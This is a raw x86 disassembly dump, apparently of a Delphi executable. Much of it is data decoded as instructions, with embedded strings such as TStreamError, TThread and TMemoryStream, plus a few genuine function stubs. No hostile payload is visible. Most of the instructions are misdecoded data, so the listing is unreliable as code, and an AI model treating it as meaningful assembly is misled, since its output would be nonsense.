jae r-xdata
outsd
outsb
je r-xdata
jae r-xdata
xor [ ecx ] eax
add [ eax ] al
add [ eax ] al
push es
shl [ esp + edx + 0x2030041 ] 0x2e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ss
js r-xdata
add [ eax + esi + 0x30d80040 ] bh
inc eax
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ ebp + edx + 0xc080041 ] cl
push esp
dec esi
outsd
je r-xdata
or [ 0xb060041 ] dl
push esp
push ebx
push 0x53746669
je r-xdata
xor eax [ eax ]
js r-xdata
jae r-xdata
je r-xdata
js r-xdata
dec edi
outsb
insb
jns r-xdata
jae r-xdata
int3
pop es
inc ebx
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx + 0xc0041 ] bh
add [ eax ] al
adc [ esi ] dl
outsd
jb r-xdata
inc eax
add [ eax * 2 + 0x65727453 ] cl
popad
adc al 0x31
jns r-xdata
jae r-xdata
je r-xdata
outsd
dec esp
je r-xdata
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] bh
xor eax [ eax ]
jl r-xdata
push esp
push ebx
push 0x4374726f
adc eax 0x9010041
jb r-xdata
add al 0x1
add [ eax ] al
cmp bh 0xff
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
inc eax
add [ esi + edx + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
outsb
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
jbe r-xdata
je r-xdata
push 0x6e6f4374
jb r-xdata
add [ eax - 0x74ffbeec ] esi
shl [ eax ] 0x15
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
pop ss
inc ecx
add [ eax + eax ] cl
add [ eax ] al
adc [ esi ] dl
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ ebx ] cl
inc ebp
inc esi
dec edi
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
inc eax
xor eax [ eax ]
je r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov ah 0x15
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
xor [ eax ] eax
or al 0x45
push ebx
je r-xdata
je r-xdata
jne r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc ebp
jb r-xdata
add [ ecx + esi ] dl
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ 0x72434645 ] cl
popad
je r-xdata
inc eax
add [ esi + edx + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc004116
add [ eax ] al
add [ eax ] dl
push ss
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
pop ss
inc ecx
add [ eax + eax ] cl
inc eax
add [ ebx ] cl
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
inc eax
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
pop ss
pop ss
inc ecx
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] dl
inc ebp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
inc eax
add [ ecx + esi ] dl
rcr [ eax ] 0x17
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
inc ebp
jb r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx + 0x41 ] bl
add [ eax + eax ] cl
add [ eax ] al
mov ah 0x15
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x18 ] bh
outsd
jb r-xdata
add [ eax ] al
and al 0x17
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] cl
inc ebp
push edx
popad
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4117 0x0
or al 0x0
outsd
jb r-xdata
add [ eax ] al
dec esi
outsd
je r-xdata
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
and [ eax ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
sbb [ ecx ] al
or al 0x0
add [ eax ] al
and al 0x17
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
pop ss
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x17 ] dh
xor [ eax ] al
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
inc eax
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ecx ] bl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
int3
nop
aam 0x18
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
fdiv [ eax ]
inc eax
add [ ecx + esi ] dl
inc eax
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
mov [ ecx ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004119 ] cl
add [ eax ] al
add ah cl
outsb
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] cl
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx ] bl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
int3
add [ eax ] al
int3
lea eax [ eax ]
xor [ ecx ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
sbb [ ecx ] eax
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x18
inc ecx
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add al ah
sbb [ ecx ] eax
or al 0x0
add [ eax ] al
int3
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
sbb [ ecx ] al
or al 0x0
sbb [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc eax
add [ esi ] cl
inc ebp
inc ebx
insb
popad
jae r-xdata
inc eax
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
and al 0x17
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
sub_411a1d
outsb
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edi ] cl
inc ebp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
xor [ eax ] al
hlt
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
sbb al [ ecx ]
or al 0x0
add [ eax ] al
int3
outsd
jb r-xdata
jb r-xdata
sbb al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
sbb al [ ecx ]
adc [ eax ] al
add [ eax ] al
nop
outsd
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xf4004030
mov bh 0x40
add [ ecx + esi ] dl
inc eax
add [ edi ] cl
inc ebp
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx + 0x100041 ] bl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
push dx
jae r-xdata
add al bl
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] cl
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
loopne r-xdata
inc eax
add [ eax + 0x1a ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1a ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
int3
sbb eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x2400411b
add [ eax ] al
add [ eax + 0x6c004010 ] bh
xor eax [ eax ]
js r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
add [ eax ] al
add [ eax + 0x6c004010 ] bh
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x1000411b
jne r-xdata
add [ eax ] al
add [ eax ] al
add al ah
sbb [ ecx ] eax
or al 0x0
add [ eax ] al
int3
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx ] dl
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1b ] ch
inc ecx
add [ eax ] dl
arpl [ ebp + 0x73 ] sp
clc
sbb al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x41 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
cmp al 0x45
inc ecx
add [ 0x74694254 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x6c004010
xor eax [ eax ]
js r-xdata
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x1c
add [ ebx ] cl
push esp
push eax
jb r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
enter 0x4143 0x0
or edx [ esp + edx * 2 + 0x68 ]
jb r-xdata
inc eax
shr [ eax + 0x1c ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add al dh
inc esi
inc ecx
add [ eax ] al
dec eax
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add [ edx ] al
add bh bh
add [ edx + 0x400411c ] al
add [ eax ] al
add [ eax + 0x6c004010 ] bh
xor eax [ eax ]
js r-xdata
inc ecx
add [ esi - 0x23 ] al
sbb al 0x41
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x1d580040 ] cl
imul esi [ ebx + 0x74 ] 0x8b746e65
rcl [ esp + ebx + 0xb070041 ] 0x54
push eax
jb r-xdata
add [ eax + esi + 0x30d80040 ] bh
inc eax
add al dh
inc esi
inc ecx
add [ eax ] al
dec eax
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add [ eax + 0x49 ] dl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] ch
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sbb al 0x1c
inc ecx
add [ ebx + esi + 0x40 ] ch
add al al
dec eax
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
inc ecx
add cl ch
sbb al 0x41
add [ eax ] al
add [ eax ] al
add [ eax + 0x1d ] ch
inc ecx
add [ ebp + ebx + 0x41 ] dl
add [ eax ] al
imul esi [ ebx + 0x74 ] 0x68746e65
sbb al 0x41
add [ ecx + edx ] cl
inc eax
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
sbb al 0x1c
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jpe r-xdata
jae r-xdata
xor eax [ eax ]
imul esi [ ebx + 0x74 ] 0x94746e65
sbb eax 0x15070041
push esp
dec ecx
outsb
je r-xdata
add [ ebp - 0x7c33ffc0 ] cl
inc esp
and al 0x4
clc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
mov esp 0xd8004030
jb r-xdata
xor [ eax ] al
lodsb [ esi ]
dec edx
inc ecx
add [ eax ] al
dec eax
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add [ eax ] bl
dec ebx
inc ecx
add al bl
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add al bh
dec ebx
inc ecx
add [ eax ] ch
dec esp
inc ecx
add [ eax ] ah
dec esp
inc ecx
add [ edx + ecx * 2 + 0x41 ] dh
add [ edx ] al
add bh bh
sbb [ ebx + 0x41 ] cl
imul esi [ ebx + 0x74 ] 0x58746e65
sbb eax 0x1c900041
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
push ds
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx ] ch
inc ecx
add [ edx ] bh
push ds
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sub_412094
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
test al 0x53
outsb
dec ecx
je r-xdata
inc ecx
add [ eax - 0x4bffbeae ] ah
bound eax [ ecx ]
call 0xffffffffec416277
push ebx
bound eax [ ecx ]
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
add [ ecx ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4121 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x30004121 ] bl
add [ eax ] al
add [ edi + ebx + 0x336c0041 ] al
inc eax
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
or al 0x60
inc ecx
add [ eax ] al
dec eax
inc ecx
add [ eax - 0x5fffbead ] ch
push edx
inc ecx
add [ edx + 0x62e80041 ] dh
inc ecx
add ah ch
sub_412289
and [ ecx ] eax
insb
xor eax [ eax ]
js r-xdata
push 0x41
add [ 0x6e614854 ] cl
insb
push ebx
je r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ esi + 0x6ad80041 ] dl
inc ecx
add ah ch
push 0x41
add [ edx + ebp * 2 + 0x6a9c0041 ] cl
inc ecx
add [ eax - 0x53ffbe99 ] bl
push ebx
je r-xdata
popad
insd
mov eax eax
and al 0x23
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x23 ] al
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x22 ] ah
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
lodsb [ esi ]
insb
inc ecx
add [ esi + 0x6ad80041 ] dl
inc ecx
add ah ch
push 0x41
add [ edx + ebp * 2 + 0x6a9c0041 ] cl
inc ecx
add [ eax - 0x53ffbe99 ] bl
push 0x41
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
dec ebp
insd
outsd
jb r-xdata
insd
cwde
and eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x23
inc ecx
add [ eax ] dl
add [ eax ] al
add ah cl
and [ ecx ] eax
insb
xor eax [ eax ]
js r-xdata
popad
push 0x54130041
inc ebx
jne r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ esi + 0x66e00041 ] dl
inc ecx
add al bh
inc cx
add al ch
insb
inc ecx
add [ eax + 0x29 ] ch
inc eax
add [ eax ] ah
insd
inc ecx
add [ eax + ebp * 2 ] bl
inc ecx
add [ ebx ] dl
push esp
jns r-xdata
push ebx
je r-xdata
sbb al 0x68
je r-xdata
xchg esp eax
inc cx
add [ eax + esi * 2 ] al
je r-xdata
outsd
jb r-xdata
insd
popad
insd
adc al 0x24
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp ] dh
inc ecx
add [ eax + eax ] dl
add [ eax ] al
dec esp
and eax [ ecx ]
insb
xor eax [ eax ]
js r-xdata
add [ eax + edx + 0x40040 ] ch
push ebx
inc ecx
add [ esi + ebp * 2 ] dl
inc ecx
add [ eax + ebp * 2 ] bl
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
add [ esi + 0x66e00041 ] dl
inc ecx
add al bh
inc cx
add al ch
insb
inc ecx
add [ ecx + esi * 2 + 0x6d200041 ] cl
inc ecx
add [ eax + ebp * 2 ] bl
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
add [ ecx ] al
add [ eax ] al
popad
insd
mov eax eax
nop
and al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi 0xc004124
add [ eax ] al
add ah cl
and [ ecx ] eax
insb
xor eax [ eax ]
js r-xdata
inc ecx
add [ 0x6d654d54 ] cl
push 0x6e140041
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
inc esp
insd
inc ecx
add [ esi + 0x6de80041 ] dl
inc ecx
add al bh
inc cx
add al ch
insb
inc ecx
add [ eax + 0x2000416e ] ah
insd
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
add [ eax ] al
or eax 0x72745354
imul ebp [ esi + 0x67 ] 0x65727453
popad
insd
sbb [ 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x25
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ebx + 0x41 ] cl
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
push esp
jno r-xdata
push 0xe0041
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add al 0x0
inc ecx
add al bh
inc cx
add [ edi + ebp * 2 ] dh
inc ecx
add [ edi + ebp * 2 + 0x41 ] dh
add [ edi + ebp * 2 + 0x681c0041 ] ch
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ esi + 0x70040041 ] dl
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
arpl [ ebp + 0x53 ] sp
je r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_412859
outsb
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edi ] al
inc ebp
push esp
push 0x64616572
shr [ eax ] 0x1
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
sub [ ecx ] al
cmp al 0x0
add [ eax ] al
mov eax 0x6c004010
xor eax [ eax ]
hlt
sub_4128fe
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
inc esp
and al 0x4
aam 0xe9
[ eax ] al
add ah cl
xor eax 0x43004129
sub [ ecx ] eax
dec ebp
sub [ ecx ] eax
sub eax 0x57004129
sub [ ecx ] eax
sub [ gs : ecx ] eax
outsd
sub [ ecx ] eax
add al [ eax ]
add [ eax ] al
pop eax
sbb [ ebx + 0x59ec86e2 ] cl
jns r-xdata
inc esp
and al 0x4
fmul [ ebx - 0x74fbdbbc ]
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e7e285
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
inc ebp
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
jae r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
dec [ ebx - 0x3f7c3340 ]
fsubr st1
push edi
mov [ eax ] eax
add [ ebx - 0x27fbdbbc ] al
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
add bh bh
pop ebp
retn 0x4
sub_412cac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405dac
pop edi
pop esi
pop ebx
retn
sub_412cd4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
